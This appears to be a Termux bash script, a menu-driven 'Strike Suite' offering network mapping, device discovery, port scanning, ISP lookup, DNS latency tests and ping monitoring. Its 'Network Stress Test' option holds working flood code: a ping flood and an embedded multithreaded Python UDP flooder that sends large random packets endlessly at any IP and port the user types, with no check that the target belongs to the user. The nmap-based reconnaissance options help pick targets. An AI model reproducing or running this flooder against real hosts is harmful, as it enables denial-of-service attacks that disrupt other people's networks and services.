#!/data/data/com.termux/files/usr/bin/bash

check_dependencies() {
    local pkgs=(traceroute nmap dnsutils python nc curl)
    local missing=()
    for pkg in "${pkgs[@]}"; do
        if ! command -v "$pkg" &> /dev/null; then
            missing+=("$pkg")
        fi
    done
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "\e[1;33m[*] Installing missing dependencies: ${missing[*]}...\e[0m"
        pkg install "${missing[@]}" -y >/dev/null 2>&1
    fi
}

# Define colors and symbols
CYAN='\e[1;36m'
MAGENTA='\e[1;35m'
GREEN='\e[1;32m'
RED='\e[1;31m'
YELLOW='\e[1;33m'
WHITE='\e[1;37m'
GRAY='\e[1;30m'
BLUE='\e[1;34m'
BOLD='\e[1m'
NC='\e[0m'

# UI Symbols
CHECK="✔"
WARN="⚠"
INFO="ℹ"
ARROW="➔"

# Exit and Return handler
back_to_menu() {
    echo -e "\n${RED}[${WARN}] Operation stopped by user. Cleaning up...${NC}"
    pkill -f "python3 -c" >/dev/null 2>&1
    sleep 1
    main_menu
}

# Enhanced Banner
show_banner() {
    clear
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│${NC}   ${MAGENTA}${BOLD}⚡  D A J  -  S T R I K E   S U I T E  v2.0  ⚡${NC}   ${CYAN}│${NC}"
    echo -e "${CYAN}├─────────────────────────────────────────────────────────┤${NC}"
    echo -e "${CYAN}│${NC}   ${GREEN}${BOLD}🧬 ARCHITECT :${NC} MAZEN AL-DAJ                         ${CYAN}│${NC}"
    echo -e "${CYAN}│${NC}   ${YELLOW}${BOLD}📡 SUPPORT   :${NC} +963 980 962 294                     ${CYAN}│${NC}"
    echo -e "${CYAN}│${NC}   ${BLUE}${BOLD}📅 DATE      :${NC} $(date '+%Y-%m-%d %H:%M')               ${CYAN}│${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────┘${NC}"
    echo ""
}

# Professional Animated Loader
animated_loader() {
    local label=$1
    echo -ne "${MAGENTA}[*] ${label} [${NC}"
    for i in {1..25}; do
        echo -ne "${GREEN}■${NC}"
        sleep 0.02
    done
    echo -e "${GREEN}] 100%${NC}"
}

# Get Network Info
get_network_info() {
    gateway_ip=$(ip route | grep default | awk '{print $3}' | head -n1)
    if [ -z "$gateway_ip" ]; then
        gateway_ip=$(traceroute -4 -m 1 8.8.8.8 2>/dev/null | awk '/1/{print $2}' | grep -E '^[0-9.]+$')
    fi
    [ -z "$gateway_ip" ] && gateway_ip="192.168.1.1"
    subnet=$(echo "$gateway_ip" | cut -d. -f1-3)
    local_ip=$(ip addr show | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -n1)
}

# 1. Network Map (Nodes/Routers)
scan_network() {
    trap back_to_menu SIGINT
    show_banner
    get_network_info
    animated_loader "Analyzing network infrastructure"
    echo -e "${GREEN}[${CHECK}] Network detected: ${subnet}.0/24${NC}"
    echo -e "${BLUE}[${INFO}] Your local IP: ${local_ip}${NC}"
    echo -e "${RED}[${WARN}] Press [CTRL+C] to return to main menu${NC}"
    echo -e "${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    # Use nmap for quick scan of common router ports
    nmap -n -sn -PR "$subnet.0/24" | grep "Nmap scan report for" | awk '{print $5}' | while read -r ip; do
        (
            if [[ "$ip" == "$gateway_ip" ]]; then
                echo -e "${GREEN}[CORE]  ${ARROW} ${RED}$ip ${WHITE}(Main Gateway)${NC}"
            elif nc -w 1 -z "$ip" 80 443 22 23 8080 &>/dev/null; then
                echo -e "${CYAN}[NODE]  ${ARROW} ${MAGENTA}$ip ${WHITE}(Access Point / Management Interface)${NC}"
            fi
        ) &
    done
    wait
    echo -e "${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    trap - SIGINT
    read -p "Press [Enter] to return..."
}

# 2. Get all connected devices
scan_all_devices() {
    trap back_to_menu SIGINT
    show_banner
    get_network_info
    animated_loader "Extracting connected device identities"
    echo -e "${GREEN}[${CHECK}] Network detected: ${subnet}.0/24${NC}"
    echo -e "${RED}[${WARN}] Press [CTRL+C] to cancel${NC}"
    echo -e "${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    local active_hosts=0
    # Scan active devices using nmap to get hostnames
    nmap -sn "$subnet.0/24" | awk '/Nmap scan report for/{
        name=""; ip="";
        if ($5 ~ /^[0-9.]+$/) { ip=$5; name="Unknown Device"; }
        else { name=$5; ip=$6; gsub(/[()]/, "", ip); }
        print ip "|" name
    }' | while IFS='|' read -r ip name; do
        ((active_hosts++))
        if [[ "$ip" == "$gateway_ip" ]]; then name="Gateway_Router"; fi
        echo -e "${CYAN}[ALIVE] ${ARROW} ${YELLOW}$(printf "%-15s" "$ip") ${GRAY}│ ${GREEN}$name${NC}"
    done
    
    echo -e "${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${YELLOW}📊 [Device Scan Report]${NC}"
    echo -e "${WHITE}${ARROW} Total active devices: ${GREEN}$active_hosts${NC}"
    load_status="${GREEN}Stable${NC}"
    [ $active_hosts -gt 10 ] && load_status="${RED}High (Congestion)${NC}"
    echo -e "${WHITE}${ARROW} Network load status : $load_status"
    echo -e "${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    trap - SIGINT
    read -p "Press [Enter] to return..."
}

# 3. Port scan a specific target
port_scan_target() {
    show_banner
    echo -e "${MAGENTA}[*] Auditing system port security...${NC}"
    echo -ne "${YELLOW}▶ Enter target IP address: ${NC}"
    read target_ip
    if [[ ! $target_ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo -e "${RED}[!] Invalid IP format!${NC}" ; sleep 1 ; return
    fi
    
    echo -e "${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}[*] Scanning most common ports on $target_ip...${NC}"
    
    local open_ports=()
    # Use nmap for professional port scanning
    nmap -T4 -F "$target_ip" | grep "open" | while read -r line; do
        port=$(echo "$line" | cut -d/ -f1)
        service=$(echo "$line" | awk '{print $3}')
        echo -e "${GREEN}[🛡️ OPEN]  ${ARROW} Port ${YELLOW}$port ${WHITE}($service)${NC}"
    done
    
    echo -e "${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p "Press [Enter] to return..."
}

# 4. Internet and ISP Info
isp_public_recon() {
    show_banner
    animated_loader "Fetching external WAN network data"
    echo -e "${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    # Use ip-api.com in JSON format for better processing
    public_logs=$(curl -s --connect-timeout 5 "http://ip-api.com/json")
    if [[ $public_logs == *"success"* ]]; then
        p_ip=$(echo "$public_logs" | grep -o '"query":"[^"]*' | cut -d'"' -f4)
        p_isp=$(echo "$public_logs" | grep -o '"isp":"[^"]*' | cut -d'"' -f4)
        p_country=$(echo "$public_logs" | grep -o '"country":"[^"]*' | cut -d'"' -f4)
        p_city=$(echo "$public_logs" | grep -o '"city":"[^"]*' | cut -d'"' -f4)
        
        echo -e "${CYAN}[ Public IP ]  ${WHITE}${p_ip}${NC}"
        echo -e "${CYAN}[ Provider  ]  ${GREEN}${p_isp}${NC}"
        echo -e "${CYAN}[ Location  ]  ${WHITE}${p_country}, ${p_city}${NC}"
    else
        echo -e "${RED}[-] Connection failed. Check internet availability!${NC}"
    fi
    echo -e "${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    read -p "Press [Enter] to return..."
}

# 5. DNS Speed Test
dns_auditor() {
    show_banner
    animated_loader "Testing DNS server latency"
    echo -e "${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    local min_latency=9999
    local best_dns="None"
    declare -A servers=( ["Google DNS"]="8.8.8.8" ["Cloudflare"]="1.1.1.1" ["Quad9"]="9.9.9.9" ["OpenDNS"]="208.67.222.222" )
    
    for name in "${!servers[@]}"; do
        ip="${servers[$name]}"
        latency=$(ping -c 2 -W 2 $ip 2>/dev/null | awk -F'/' 'END{print $5}')
        if [ -z "$latency" ]; then 
            latency_str="${RED}TIMEOUT${NC}"
        else 
            latency_str="${GREEN}${latency} ms${NC}"
            int_latency=$(echo "$latency" | cut -d. -f1)
            if [ $int_latency -lt $min_latency ]; then
                min_latency=$int_latency
                best_dns=$name
            fi
        fi
        echo -e "${CYAN}[DNS] ${YELLOW}$(printf "%-12s" "$name") ${ARROW} $latency_str"
    done
    
    echo -e "${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${YELLOW}📊 [System Recommendation]${NC}"
    echo -e "${WHITE}${ARROW} Best server for you: ${GREEN}$best_dns${NC} (${min_latency} ms)"
    echo -e "${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    read -p "Press [Enter] to return..."
}

# 6. Monitor connection stability
monitor_ping() {
    show_banner
    echo -e "${MAGENTA}[*] Monitoring live data packets (ICMP)...${NC}"
    echo -e "${RED}[${WARN}] Press [CTRL+C] to return to main menu${NC}"
    echo -e "${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    trap back_to_menu SIGINT
    
    # Continuous monitoring with colored time display
    ping 8.8.8.8 | while read -r pong; do
        if [[ "$pong" == *"time="* ]]; then
            time_val=$(echo "$pong" | grep -o 'time=[0-9.]*' | cut -d= -f2)
            color=$GREEN
            if (( $(echo "$time_val > 100" | bc -l) )); then color=$YELLOW; fi
            if (( $(echo "$time_val > 250" | bc -l) )); then color=$RED; fi
            echo -e "${color}[PACKET-RX] ${ARROW} Latency: ${WHITE}${time_val} ms${NC}"
        fi
    done
}

# 7. Network Stress Test (Enhanced)
stress_test_mode() {
    trap back_to_menu SIGINT
    show_banner
    echo -e "${RED}${BOLD}⚠️  [Warning] Stress Test Mode:${NC}"
    echo -e "  [1] ICMP Test (Ping Flood)"
    echo -e "  [2] UDP Flood Test (High Speed - Python)"
    echo ""
    echo -ne "${YELLOW}▶ Select mode (1 or 2): ${NC}"
    read attack_mode
    
    echo -ne "${YELLOW}▶ Target IP (e.g., 192.168.1.1): ${NC}"
    read target_ip
    [[ ! $target_ip =~ ^[0-9.]+$ ]] && return

    if [ "$attack_mode" == "2" ]; then
        echo -ne "${YELLOW}▶ Port (Default 80): ${NC}"
        read target_port
        [ -z "$target_port" ] && target_port=80
        
        echo -ne "${YELLOW}▶ Thread Count (e.g., 50): ${NC}"
        read thread_count
        [ -z "$thread_count" ] && thread_count=50
    fi
    
    echo -e "${RED}[!] Test started on: $target_ip... Press [CTRL+C] to stop.${NC}"
    echo -e "${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    if [ "$attack_mode" == "1" ]; then
        ping -f -s 1000 "$target_ip"
    elif [ "$attack_mode" == "2" ]; then
        python3 -c "
import socket, threading, time, random
target = '$target_ip'
port = $target_port
threads = $thread_count
payload = random._urandom(1024) * 60 # Large data packet

def udp_flood():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            s.sendto(payload, (target, port))
        except: pass

for i in range(threads):
    t = threading.Thread(target=udp_flood, daemon=True)
    t.start()

print(f'[*] Flooding {target}:{port} with {threads} threads...')
while True: time.sleep(1)
"
    fi
}

# Main Menu
main_menu() {
    while true; do
        trap - SIGINT
        show_banner
        echo -e "${WHITE}${BOLD}  System Module List:${NC}"
        echo -e "  ${CYAN}[01]${NC} Infrastructure Map       ${GRAY}(Nodes & Routers)${NC}"
        echo -e "  ${CYAN}[02]${NC} List All Connected Devices ${GRAY}(Phones & PCs)${NC}"
        echo -e "  ${CYAN}[03]${NC} Port Scan Target         ${GRAY}(Port Sniper)${NC}"
        echo -e "  ${CYAN}[04]${NC} Internet & ISP Info      ${GRAY}(WAN Intel)${NC}"
        echo -e "  ${CYAN}[05]${NC} DNS Speed Test           ${GRAY}(DNS Benchmark)${NC}"
        echo -e "  ${CYAN}[06]${NC} Monitor Signal Stability  ${GRAY}(Live Monitor)${NC}"
        echo -e "  ${CYAN}[07]${NC} Network Stress Test      ${GRAY}(Stress Test)${NC}"
        echo -e "  ${CYAN}[08]${NC} Exit System              ${GRAY}(Exit)${NC}"
        echo ""
        echo -ne "${MAGENTA}${BOLD}DAJ-SUITE ${ARROW} ${NC}"
        read choice

        case $choice in
            1|01) scan_network ;;
            2|02) scan_all_devices ;;
            3|03) port_scan_target ;;
            4|04) isp_public_recon ;;
            5|05) dns_auditor ;;
            6|06) monitor_ping ;;
            7|07) stress_test_mode ;;
            8|08) echo -e "${RED}[-] Closing system. Goodbye.${NC}" ; exit 0 ;;
            *) echo -e "${RED}[!] Invalid choice!${NC}" ; sleep 1 ;;
        esac
    done
}

# Start Execution
check_dependencies
main_menu
